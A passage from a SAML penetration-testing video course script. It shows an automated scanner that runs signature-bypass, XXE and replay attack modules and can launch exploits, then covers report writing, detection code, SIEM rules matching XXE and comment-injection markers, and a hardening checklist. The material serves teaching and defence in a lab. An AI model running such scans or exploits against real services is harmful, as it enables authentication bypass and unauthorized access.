from attacks.nosig_attack import MissingSignatureAttack
from attacks.xxe_attack import XXEAttack
from attacks.replay_attack import ReplayAttack
# ... import other attack modules
from reporting.reporter import Reporter

class SAMLScanner:
    """Automated SAML penetration testing scanner"""

    def __init__(self, target_url: str, config: Dict):
        self.target_url = target_url
        self.config = config
        self.attack_modules = self._load_attack_modules()
        self.reporter = Reporter()

    def _load_attack_modules(self) -> List[BaseAttack]:
        """Load all attack modules"""
        attacks = [
            MissingSignatureAttack(self.target_url, self.config),
            XXEAttack(self.target_url, self.config),
            # Add all other attack modules
        ]
        return attacks

    def run_all_checks(self):
        """Run all vulnerability checks"""
        print(f"\n{'='*70}")
        print(f"SAML Security Scan: {self.target_url}")
        print(f"{'='*70}\n")

        results = {
            'target': self.target_url,
            'vulnerabilities_found': 0,
            'checks_run': 0,
            'findings': []
        }

        for attack in self.attack_modules:
            print(f"\n[*] Running: {attack.get_attack_name()}")
            results['checks_run'] += 1

            try:
                is_vulnerable = attack.check_vulnerability()

                if is_vulnerable:
                    results['vulnerabilities_found'] += 1
                    findings = attack.get_findings()
                    results['findings'].extend(findings)

                    # Optionally run exploit
                    if self.config.get('run_exploits', False):
                        print(f"[*] Running exploit for {attack.get_attack_name()}...")
                        exploit_result = attack.exploit()
                        if exploit_result:
                            print(f"[+] Exploit successful: {exploit_result}")

            except Exception as e:
                print(f"[!] Error in {attack.get_attack_name()}: {e}")

        # Generate report
        print(f"\n{'='*70}")
        print(f"Scan Complete")
        print(f"{'='*70}")
        print(f"Checks run: {results['checks_run']}")
        print(f"Vulnerabilities found: {results['vulnerabilities_found']}")

        if results['vulnerabilities_found'] > 0:
            print(f"\n[!] Target is VULNERABLE")
            self.reporter.generate_report(results, output_format='text')
        else:
            print(f"\n[+] No vulnerabilities detected")

        return results
```

---

### SCENE 7: Using the Framework (11:00 - 12:00)

**[VISUAL: Terminal showing the CLI tool in action]**

**NARRATOR:**
"Let's use the complete framework to scan our vulnerable lab application."

```bash
# Main CLI tool
python saml_pentest.py scan --target http://localhost:5001/saml/acs-nosig --config config/pentest.yaml

# Output:
======================================================================
SAML Security Scan: http://localhost:5001/saml/acs-nosig
======================================================================

[*] Running: Missing Signature Validation
[+] VULNERABLE: Accepts unsigned SAML assertions

[*] Running: XXE Injection
[+] VULNERABLE: XXE injection successful

[*] Running: Replay Attack
[+] VULNERABLE: No replay protection

[*] Running: XML Signature Wrapping
[+] VULNERABLE: XSW bypass possible

...

======================================================================
Scan Complete
======================================================================
Checks run: 10
Vulnerabilities found: 7

[!] Target is VULNERABLE

Report saved to: reports/scan_2026-02-07_123045.html
```

**[VISUAL: Generated HTML report showing all findings with severity, evidence, and remediation]**

**NARRATOR:**
"Complete automation. The framework tests all vulnerability categories, generates detailed findings, and produces professional reports. Extensible for new attacks. Reusable across different penetration tests. This is how professional SAML security testing is done."

"Final episode: professional reporting and building detection capabilities."

**[VISUAL: Preview showing pentest report and SIEM correlation dashboards]**

---

## Episode 10: Professional Reporting & Detection

**Duration:** 11 minutes
**Level:** L3 - Enterprise Architecture
**Learning Objective:** Create professional penetration test reports for SAML findings and implement detection capabilities through SP-IdP log correlation.

---

### SCENE 1: The Deliverable (0:00 - 1:15)

**[VISUAL: Professional penetration test report with executive summary, findings, evidence, and remediation]**

**NARRATOR:**
"You've found the vulnerabilities. You've exploited them. You've demonstrated impact. Now comes the most important part: communicating your findings to stakeholders who will fix them."

"A penetration test is only as valuable as the report you deliver. Executives need risk context. Developers need remediation guidance. Security teams need detection strategies. This episode covers professional SAML security reporting and building the defensive capabilities to detect attacks in production."

---

### SCENE 2: Report Structure (1:15 - 3:30)

**[VISUAL: Report template with sections highlighted]**

**NARRATOR:**
"A professional SAML penetration test report has six sections."

```markdown
# SAML Security Assessment Report

## Executive Summary
- Engagement scope and methodology
- High-level findings (number of critical/high/medium/low)
- Business risk summary
- Recommended actions timeline

## Methodology
- Testing approach (black box / gray box / white box)
- Tools used
- Testing timeline
- Authorization and scope

## Findings
For each vulnerability:
  - Title and severity
  - Description (what is it?)
  - Risk (why does it matter?)
  - Evidence (proof of exploitation)
  - Affected components
  - Remediation steps (how to fix it)
  - References (CWE, CVE, OWASP)

## Technical Details
- Attack vectors demonstrated
- Exploitation techniques
- Payloads used
- Screenshots/logs

## Remediation Roadmap
- Prioritized fixes
- Timeline recommendations
- Long-term improvements

## Detection Recommendations
- How to monitor for these attacks
- SIEM queries
- Alert configurations
```

**[VISUAL: Code showing report generator]**

```python
# reporting/reporter.py
"""
Professional SAML Security Report Generator
"""

from datetime import datetime
from typing import List, Dict
from jinja2 import Template
from attacks.base_attack import Finding, Severity

class Reporter:
    """Generate professional penetration test reports"""

    def generate_report(self, scan_results: Dict, output_format='html'):
        """Generate report from scan results"""

        report_data = {
            'scan_date': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'target': scan_results['target'],
            'total_checks': scan_results['checks_run'],
            'total_findings': scan_results['vulnerabilities_found'],
            'findings': scan_results['findings'],
            'critical_count': sum(1 for f in scan_results['findings'] if f.severity == Severity.CRITICAL),
            'high_count': sum(1 for f in scan_results['findings'] if f.severity == Severity.HIGH),
            'medium_count': sum(1 for f in scan_results['findings'] if f.severity == Severity.MEDIUM),
            'low_count': sum(1 for f in scan_results['findings'] if f.severity == Severity.LOW),
        }

        if output_format == 'html':
            return self._generate_html_report(report_data)
        elif output_format == 'json':
            return self._generate_json_report(report_data)
        elif output_format == 'markdown':
            return self._generate_markdown_report(report_data)
        else:
            return self._generate_text_report(report_data)

    def _generate_markdown_report(self, data: Dict) -> str:
        """Generate markdown report"""

        md = f"""# SAML Security Assessment Report

**Target:** {data['target']}
**Scan Date:** {data['scan_date']}
**Total Checks:** {data['total_checks']}
**Vulnerabilities Found:** {data['total_findings']}

---

## Executive Summary

This assessment identified {data['total_findings']} security vulnerabilities in the SAML implementation:

- **Critical:** {data['critical_count']}
- **High:** {data['high_count']}
- **Medium:** {data['medium_count']}
- **Low:** {data['low_count']}

### Risk Assessment

"""
        if data['critical_count'] > 0:
            md += "**CRITICAL RISK:** Critical vulnerabilities allow complete authentication bypass. Immediate remediation required.\n\n"
        elif data['high_count'] > 0:
            md += "**HIGH RISK:** Significant vulnerabilities that could lead to unauthorized access. Remediate within 7 days.\n\n"
        else:
            md += "**MODERATE RISK:** Medium severity issues detected. Remediate within 30 days.\n\n"

        md += "---\n\n## Detailed Findings\n\n"

        # Sort findings by severity
        sorted_findings = sorted(
            data['findings'],
            key=lambda f: ['critical', 'high', 'medium', 'low', 'info'].index(f.severity.value)
        )

        for i, finding in enumerate(sorted_findings, 1):
            md += f"""### Finding {i}: {finding.vulnerability}

**Severity:** {finding.severity.value.upper()}
**CWE:** {finding.cwe or 'N/A'}
**CVSS Score:** {finding.cvss or 'N/A'}

#### Description
{finding.description}

#### Evidence
```
{finding.evidence}
```

#### Remediation
{finding.remediation}

---

"""

        md += """## Remediation Roadmap

### Immediate Actions (0-7 days)
- Fix all CRITICAL severity findings
- Implement signature validation
- Deploy defusedxml for XXE protection

### Short-term (7-30 days)
- Implement replay protection with Redis
- Enable strict mode in SAML configuration
- Fix session management issues

### Long-term (30-90 days)
- Implement detection and monitoring
- Regular security testing
- Certificate rotation procedures

---

## References

- OWASP SAML Security Cheat Sheet
- SAML 2.0 Specification (OASIS)
- CWE-347: Improper Verification of Cryptographic Signature
- CWE-611: Improper Restriction of XML External Entity Reference

---

*Report generated by SAML Pentest Toolkit*
*{data['scan_date']}*
"""

        return md
```

---

### SCENE 3: Writing Effective Findings (3:30 - 5:30)

**[VISUAL: Side-by-side comparison of poor vs excellent finding write-ups]**

**NARRATOR:**
"Here's the difference between a poor finding and an excellent one."

**[VISUAL: Poor finding example]**

```
POOR EXAMPLE:

Title: SAML Vulnerability
Severity: High
Description: The app doesn't check SAML signatures.
Remediation: Fix it.
```

**[VISUAL: Excellent finding example]**

```
EXCELLENT EXAMPLE:

Title: Missing SAML Signature Validation Allows Complete Authentication Bypass
Severity: CRITICAL
CVSS: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
CWE: CWE-347 (Improper Verification of Cryptographic Signature)

Description:
The SAML Assertion Consumer Service (ACS) endpoint at /saml/acs does not
validate the digital signature on SAML assertions. The application parses
the SAML response XML directly using lxml and extracts claims (NameID and
role attributes) without verifying that the assertion was signed by a
trusted Identity Provider.

This vulnerability allows any attacker to forge SAML assertions claiming
any identity with arbitrary privileges. No credentials, authentication,
or MFA bypass is required.

Business Impact:
- Complete authentication bypass for all application functions
- Unauthorized access to any user account including administrators
- Data breach risk from unrestricted access
- Compliance violations (SOC2, ISO 27001, PCI-DSS)

Technical Details:
The vulnerable code at line 45 of saml_handler.py:

    root = etree.fromstring(base64.b64decode(saml_response))
    name_id = root.find('.//saml:NameID', ns).text
    session['user'] = name_id  # No signature check!

Evidence of Exploitation:
A forged unsigned assertion was crafted claiming identity
"attacker@evil.com" with role "superadmin". When submitted to the ACS
endpoint, the application accepted it and created an authenticated session.

Proof:
- Request timestamp: 2026-02-07 14:30:15
- Forged SAMLResponse: PHNhbWxwOlJlc3BvbnNl...
- Server response: 302 Redirect to /dashboard
- Session cookie issued: session=eyJ1c2VyIjogImF0dGFja2VyQGV2aWwuY29tIn0

Affected Components:
- /saml/acs endpoint (all POST requests)
- Session management (all authenticated sessions)

Remediation:
IMMEDIATE (implement within 24 hours):

1. Replace custom SAML parsing with python3-saml library:

    from onelogin.saml2.auth import OneLogin_Saml2_Auth

    auth = OneLogin_Saml2_Auth(request_data, saml_settings)
    auth.process_response()  # Validates signature

    if not auth.is_authenticated():
        raise SecurityError("Invalid SAML")

    session['user'] = auth.get_nameid()

2. Configure security settings in saml_settings:

    "security": {
        "wantAssertionsSigned": True,
        "wantMessagesSigned": True,
    }

3. Set strict mode to True:

    "strict": True

4. Test thoroughly with legitimate and forged assertions

VERIFICATION:
After remediation, verify that unsigned assertions are rejected with
400/403 status codes and appropriate error messages.

References:
- OWASP SAML Security Cheat Sheet
- CWE-347: https://cwe.mitre.org/data/definitions/347.html
- SAML 2.0 Technical Overview (OASIS)
```

**NARRATOR:**
"The excellent finding includes everything a developer needs: what the vulnerability is, why it matters to the business, proof that you exploited it, exactly how to fix it with code examples, and verification steps. That's the difference between a report that gets ignored and one that drives action."

---

### SCENE 4: Detection and Monitoring (5:30 - 8:30)

**[VISUAL: SIEM dashboard showing SAML attack detection]**

**NARRATOR:**
"Reports fix vulnerabilities. Detection capabilities prevent exploitation. Let's build monitoring for SAML attacks."

```python
# detection/saml_attack_detector.py
"""
SAML Attack Detection through Log Correlation
"""

import requests
from datetime import datetime, timedelta
from typing import List, Dict

class SAMLAttackDetector:
    """Detect SAML attacks through SP-IdP log correlation"""

    def __init__(self, sp_log_api, idp_log_api):
        self.sp_log_api = sp_log_api
        self.idp_log_api = idp_log_api

    def correlate_authentication_events(self, time_window_minutes=5) -> List[Dict]:
        """
        Cross-reference SP authentications with IdP logins
        Detect Golden SAML and other anomalies
        """

        alerts = []

        # Get SP authentication events from the last hour
        sp_events = self._get_sp_authentications(timedelta(hours=1))

        for sp_event in sp_events:
            user = sp_event['user']
            auth_time = sp_event['timestamp']

            # Check if IdP has corresponding login event
            idp_events = self._get_idp_logins(
                user=user,
                start_time=auth_time - timedelta(minutes=time_window_minutes),
                end_time=auth_time + timedelta(minutes=time_window_minutes)
            )

            if len(idp_events) == 0:
                # SP auth with no IdP login - Golden SAML indicator
                alerts.append({
                    'severity': 'critical',
                    'type': 'missing_idp_event',
                    'user': user,
                    'sp_auth_time': auth_time,
                    'description': f'SP authenticated {user} but no IdP login found',
                    'recommendation': 'Investigate for Golden SAML attack'
                })

            # Check for replay attacks - multiple SP auths from one IdP login
            if len(sp_event.get('response_ids', [])) > 1:
                # Same Response ID used multiple times
                alerts.append({
                    'severity': 'high',
                    'type': 'replay_attack',
                    'user': user,
                    'response_id': sp_event['response_id'],
                    'description': f'SAML Response ID reused {len(sp_event["response_ids"])} times',
                    'recommendation': 'Implement Response ID tracking with Redis'
                })

        return alerts

    def detect_anomalous_assertions(self, saml_response_xml: str, user: str) -> List[Dict]:
        """Detect anomalies in SAML assertions"""

        from lxml import etree
        alerts = []

        root = etree.fromstring(saml_response_xml.encode())
        ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'}

        # Check 1: Unusually long validity window
        conditions = root.find('.//saml:Conditions', ns)
        if conditions is not None:
            not_before = datetime.fromisoformat(conditions.get('NotBefore').replace('Z', '+00:00'))
            not_after = datetime.fromisoformat(conditions.get('NotOnOrAfter').replace('Z', '+00:00'))
            validity_minutes = (not_after - not_before).total_seconds() / 60

            if validity_minutes > 10:
                alerts.append({
                    'severity': 'medium',
                    'type': 'long_validity',
                    'detail': f'Assertion valid for {validity_minutes} minutes (normal: 5)'
                })

        # Check 2: Comment injection indicators
        name_id_elem = root.find('.//saml:NameID', ns)
        if name_id_elem is not None:
            raw_xml = etree.tostring(name_id_elem, encoding='unicode')
            if '<!--' in raw_xml:
                alerts.append({
                    'severity': 'high',
                    'type': 'comment_injection',
                    'detail': 'NameID contains XML comments - possible injection'
                })

        # Check 3: Off-hours authentication
        issue_instant = root.find('.//saml:Assertion', ns).get('IssueInstant')
        issue_time = datetime.fromisoformat(issue_instant.replace('Z', '+00:00'))

        if issue_time.hour < 6 or issue_time.hour > 20:
            alerts.append({
                'severity': 'low',
                'type': 'unusual_time',
                'detail': f'Authentication at {issue_time.hour}:00 (outside business hours)'
            })

        # Check 4: Role escalation
        roles = [attr.text for attr in root.findall(
            ".//saml:Attribute[@Name='role']/saml:AttributeValue", ns
        )]

        expected_roles = self._get_expected_roles(user)
        if not set(roles).issubset(set(expected_roles)):
            alerts.append({
                'severity': 'high',
                'type': 'role_escalation',
                'detail': f'User {user} has unexpected roles: {roles}'
            })

        return alerts

    def generate_siem_rules(self) -> Dict[str, str]:
        """Generate SIEM correlation rules for SAML attacks"""

        return {
            'golden_saml_detection': '''
                # Splunk SPL
                index=saml_sp eventtype=authentication
                | stats count by user, timestamp
                | join user [search index=saml_idp eventtype=login]
                | where isnull(idp_timestamp)
                | eval alert="Possible Golden SAML - SP auth without IdP login"
            ''',

            'replay_attack_detection': '''
                # Splunk SPL
                index=saml_sp eventtype=authentication
                | stats count by response_id
                | where count > 1
                | eval alert="SAML Replay Attack - Response ID reused"
            ''',

            'comment_injection_detection': '''
                # Splunk SPL
                index=saml_sp eventtype=authentication
                | regex saml_response="<!--"
                | eval alert="Comment Injection Attack Detected"
            ''',

            'xxe_detection': '''
                # Splunk SPL
                index=saml_sp eventtype=authentication
                | regex saml_response="<!DOCTYPE|<!ENTITY"
                | eval alert="Possible XXE Attack in SAML"
            '''
        }
```

**[VISUAL: SIEM dashboard showing these correlation rules in action]**

**NARRATOR:**
"Detection requires log correlation. Cross-reference SP authentications with IdP logins. Alert on missing IdP events — that's Golden SAML. Alert on reused Response IDs — that's replay. Alert on XML comments in NameID — that's comment injection. These correlation rules turn your SIEM into a SAML attack detector."

---

### SCENE 5: Complete Detection Strategy (8:30 - 10:00)

**[VISUAL: Layered detection architecture diagram]**

**NARRATOR:**
"A complete SAML detection strategy has four layers."

```
Layer 1: Application-Level Detection
- Reject malformed assertions (comments, unusual IDs)
- Log all SAML processing with full context
- Alert on validation failures
- Track Response IDs in real-time

Layer 2: SIEM Correlation
- SP-IdP log correlation for Golden SAML
- Response ID reuse detection
- Anomalous assertion pattern matching
- Behavioral analytics

Layer 3: Network Monitoring
- Unusual SAML traffic patterns
- Unexpected source IPs for SAML flows
- Certificate change detection at IdP metadata

Layer 4: Threat Intelligence
- Monitor for exposed IdP signing keys
- Track known SAML exploits
- Stay updated on new attack techniques
```

**[VISUAL: Code showing comprehensive logging]**

```python
import logging
import json

def log_saml_authentication(saml_response, result, context):
    """
    Comprehensive SAML logging for detection
    """

    log_entry = {
        'timestamp': datetime.utcnow().isoformat(),
        'event_type': 'saml_authentication',
        'result': result,  # 'success' or 'failure'
        'user': context.get('user'),
        'response_id': context.get('response_id'),
        'assertion_id': context.get('assertion_id'),
        'source_ip': context.get('source_ip'),
        'user_agent': context.get('user_agent'),
        'idp_entity_id': context.get('idp_entity_id'),
        'roles': context.get('roles', []),
        'session_index': context.get('session_index'),

        # Detection indicators
        'has_signature': context.get('has_signature'),
        'validity_minutes': context.get('validity_minutes'),
        'has_comments': context.get('has_comments'),
        'off_hours': context.get('off_hours'),

        # For failed authentications
        'failure_reason': context.get('failure_reason'),
        'validation_errors': context.get('validation_errors', [])
    }

    # Log as structured JSON for SIEM ingestion
    logging.info(json.dumps(log_entry))

    # Send to SIEM
    send_to_siem(log_entry)
```

---

### SCENE 6: Series Wrap-Up (10:00 - 11:00)

**[VISUAL: Montage of all 10 episodes with key techniques]**

**NARRATOR:**
"That's the complete SAML penetration testing journey. Ten episodes. Ten attack techniques. From basic reconnaissance to Golden SAML. From manual exploitation to automated tooling. From finding vulnerabilities to detecting attacks in production."

**[VISUAL: Security checklist appearing]**

```
SAML Security Checklist:

✓ Use python3-saml or equivalent library
✓ Set strict: True
✓ Enable signature validation (wantAssertionsSigned)
✓ Use defusedxml for XXE protection
✓ Implement Response ID tracking for replay protection
✓ Read claims from verified element only (XSW defense)
✓ Reject NameIDs with XML comments
✓ Validate Audience and Destination
✓ Regenerate sessions after authentication
✓ Secure session cookies (HttpOnly, Secure, SameSite)
✓ Implement session timeout
✓ Validate RelayState against allowlist
✓ Store IdP keys in HSM
✓ Regular certificate rotation
✓ SP-IdP log correlation for detection
✓ SIEM rules for SAML attacks
✓ Incident response plan for key compromise
```

**NARRATOR:**
"The core principle: never trust XML that travels through the browser. Validate everything. Use proven libraries. Layer your defenses. Monitor for attacks. And when you find vulnerabilities, report them professionally with clear remediation guidance."

**[VISUAL: Final card with resources]**

```
Resources:
- OWASP SAML Security Cheat Sheet
- SAML 2.0 Specification (OASIS)
- python3-saml documentation
- Verifhai SAML Pentest Lab: github.com/verifhai/saml-pentest-lab

Practice Environments:
- Complete the SAML Security Assessment (EG-ASSESS-SAML-001)
- Build your own vulnerable SAML SP for testing
- Contribute to the SAML Pentest Toolkit

Next Steps:
- Take the L3 SAML Security Assessment
- Review the SAML Security Patterns (SD-PATTERN-SAML-*)
- Explore OIDC security testing
```

**NARRATOR:**
"Build secure authentication. Test thoroughly. Defend proactively. That's SAML security done right."

---

**Document Version:** 1.0
**Framework:** HAIAMM v2.0
**Practice:** Education & Guidance (EG)
**Domain:** Software (Lab)
**Lab ID:** EG-LAB-SAML-PENTEST-001
**Author:** Verifhai
**Created:** 2026-02-07
**Total Episodes:** 10
**Total Runtime:** 105 minutes
